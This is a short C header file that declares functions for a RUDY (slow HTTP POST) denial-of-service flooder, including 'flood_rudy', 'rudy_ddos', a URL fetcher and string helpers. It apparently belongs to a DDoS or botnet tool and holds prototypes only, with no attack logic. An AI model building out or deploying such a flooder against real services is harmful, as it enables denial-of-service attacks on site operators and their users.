#ifndef CALLBACKS_RUDY_DDOS_H_INCLUDED
#define CALLBACKS_RUDY_DDOS_H_INCLUDED


char *strsplit(char * s, char * tok);
char firstpunc(char *s);
int strleft(char * s, int n);
void setupparts(void);
void freeparts(void);
char *stristr(const char *String, const char *Pattern);
char *str_replace(char *orig, char *rep, char *with);
char *geturl(char *url, char *useragent, char *ip);
void *flood_rudy(void *par);

void rudy_ddos(void);

#endif


